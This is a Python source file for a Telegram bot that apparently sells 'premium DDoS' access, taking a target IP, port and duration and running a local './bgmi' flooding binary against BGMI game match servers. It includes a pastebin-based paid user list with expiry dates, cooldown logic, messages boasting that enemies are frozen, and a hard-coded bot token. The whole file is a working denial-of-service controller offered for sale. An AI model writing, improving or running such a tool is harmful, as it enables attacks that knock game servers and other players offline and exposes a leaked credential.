import os
os.system('pip install telebot')
os.system('pip install flask')
import sys
import time
import json
import requests
import subprocess
import threading
from datetime import datetime, timezone
from flask import Flask
import telebot

BOT_TOKEN = '7303763238:AAFXdA0jgegNO921sktYvKt79NtTRm6Tjsc'
bot = telebot.TeleBot(BOT_TOKEN)

# GitHub URL to check the user IDs
pastebin = 'https://pastebin.com/raw/xtBLF5Q9'

# Constants
COOLDOWN_DURATION = 180  # Cooldown duration in seconds
MAX_ATTACK_DURATION = 240  # Maximum attack duration in seconds
INVALID_PORTS = {17500, 443, 10001, 10002, 20000, 20001, 20002}

# Global variables
current_attack = None
cooldown = False
cooldown_end_time = None
attack_end_time = None
attack_user = None

def fetch_authorized_users(retries=3, delay=5):
    """Fetch the list of authorized users from the pastebin URL."""
    for attempt in range(retries):
        try:
            response = requests.get(pastebin, timeout=5)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.ReadTimeout:
            print(f"Timeout occurred while fetching authorized users. Retrying {attempt + 1}/{retries}...")
            time.sleep(delay)
        except requests.exceptions.RequestException as e:
            print(f"Error fetching authorized users: {e}")
            return {}
        except json.JSONDecodeError as e:
            print(f"JSON decode error: {e}")
            return {}
    return {}

def is_authorized(user_id):
    """Check if the user is authorized."""
    authorized_users = fetch_authorized_users()
    user_info = authorized_users.get(str(user_id))
    if user_info:
        expiry_datetime_str = user_info.get("expiry_datetime")
        if expiry_datetime_str:
            expiry_datetime = datetime.strptime(expiry_datetime_str, "%d-%m-%Y %H:%M:%S").replace(tzinfo=timezone.utc)
            if datetime.now(timezone.utc) < expiry_datetime:
                return user_info.get("valid", False)
    return False

def run_attack(ip, port, time_duration, chat_id, username, expiry_datetime):
    """Run the attack command."""
    global current_attack, cooldown, cooldown_end_time, attack_end_time, attack_user
    try:
        attack_end_time = time.time() + int(time_duration)
        cmd = f'./bgmi {ip} {port} {time_duration} 200'
        subprocess.run(['chmod', '+x', './bgmi'])
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        bot.send_message(chat_id, f"@{username} Attack started successfully\nTarget: {ip}\nPort: {port}\nTime: {time_duration} seconds.\nMethod: BGMI\n\nYour premium access expires on {expiry_datetime}.")
        return result.stdout
    except Exception as e:
        return str(e)
    finally:
        time.sleep(int(time_duration))
        bot.send_message(chat_id, f"@{username}\nAttack completed from Premium DDoS.\nAll enemies are frozen now, you can kill offline players & bots.\nCooldown period started.")
        current_attack = None
        attack_user = None
        attack_end_time = None
        cooldown = True
        cooldown_end_time = time.time() + COOLDOWN_DURATION
        time.sleep(COOLDOWN_DURATION)
        cooldown = False
        restart_script()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Handle the /start command."""
    if is_authorized(message.from_user.id):
        bot.reply_to(message, f"@{message.from_user.username} Welcome! X7 TEAM PRIVATE BOT. You are authorized to use this bot. First buy from @X7_WARREN")
    else:
        bot.reply_to(message, f"@{message.from_user.username} You are not authorized to use this X7 TEAM PRIVATE bot. First buy from @X7_WARREN")

@bot.message_handler(commands=['attack'])
def request_attack_details(message):
    """Handle the /attack command."""
    global current_attack, cooldown, cooldown_end_time, attack_end_time, attack_user
    if is_authorized(message.from_user.id):
        if current_attack is not None:
            remaining_time = int(attack_end_time - time.time())
            bot.reply_to(message, f"@{message.from_user.username} An attack is already in progress by @{attack_user}. Please wait {remaining_time} seconds until it completes.")
        elif cooldown:
            cooldown_remaining = int(cooldown_end_time - time.time())
            bot.reply_to(message, f"@{message.from_user.username} Cooldown period is active. Please wait {cooldown_remaining} seconds.")
        else:
            bot.reply_to(message, f"@{message.from_user.username} Send your IP, port, and time in this format: ip port time (max {MAX_ATTACK_DURATION} seconds)")
    else:
        bot.reply_to(message, f"@{message.from_user.username} You are not authorized to use this command because you are not my premium user.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    """Handle general messages."""
    global current_attack, cooldown, cooldown_end_time, attack_end_time, attack_user
    if is_authorized(message.from_user.id):
        try:
            data = message.text.split()
            if len(data) != 3:
                bot.send_message(message.chat.id, f"@{message.from_user.username} Invalid command format.\nCorrect Use ✅👇👇\n\n server_ip server_port duration\n\n\nsafe duration = 150-180\nmedium duration=200\nrisky duration= 200-240(depends on your luck bgmi will give a chance to enter you in match or not because, use this at your own risk.)")
                return

            ip, port, time_duration = data

            # Validate port
            if int(port) in INVALID_PORTS:
                bot.reply_to(message, "Invalid port number!\nDon't use (17500, 443, 10001, 10002, 20000, 20001, 20002), because these ports are not valid to down bgmi match server.\nPlease provide a valid port number.")
                return

            # Check if the port number has exactly 5 digits
            if not (10000 <= int(port) <= 99999):
                bot.send_message(message.chat.id, f"@{message.from_user.username} Invalid port number! Please provide a valid port number.")
                return

            # Validate time duration
            if int(time_duration) > MAX_ATTACK_DURATION:
                bot.reply_to(message, f"@{message.from_user.username} Time duration cannot exceed {MAX_ATTACK_DURATION} seconds. Please provide a valid duration.")
                return

            if current_attack is not None:
                remaining_time = int(attack_end_time - time.time())
                bot.reply_to(message, f"@{message.from_user.username} An attack is already in progress by @{attack_user}. Please wait {remaining_time} seconds until it completes.")
                return

            if cooldown:
                cooldown_remaining = int(cooldown_end_time - time.time())
                bot.reply_to(message, f"@{message.from_user.username} Cooldown period is active. Please wait {cooldown_remaining} seconds.")
                return

            attack_user = message.from_user.username
            expiry_datetime = fetch_authorized_users().get(str(message.from_user.id), {}).get("expiry_datetime", "unknown")
            current_attack = threading.Thread(target=run_attack, args=(ip, port, time_duration, message.chat.id, message.from_user.username, expiry_datetime))
            current_attack.start()
        except requests.exceptions.ReadTimeout:
            bot.reply_to(message, f"@{message.from_user.username} An error occurred: ReadTimeout. Please try again later.")
            restart_script()
        except Exception as e:
            bot.reply_to(message, f"@{message.from_user.username} An error occurred: {e}")
            restart_script()
    else:
        bot.reply_to(message, f"@{message.from_user.username} You are not authorized to use this command because you are not my X7TEAM PREMIUM user. First buy from @X7_WARREN")

def restart_script():
    """Restart the current script."""
    print("Restarting script...")
    python = sys.executable
    os.execl(python, python, *sys.argv)

if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"An error occurred: {e}")
            restart_script()
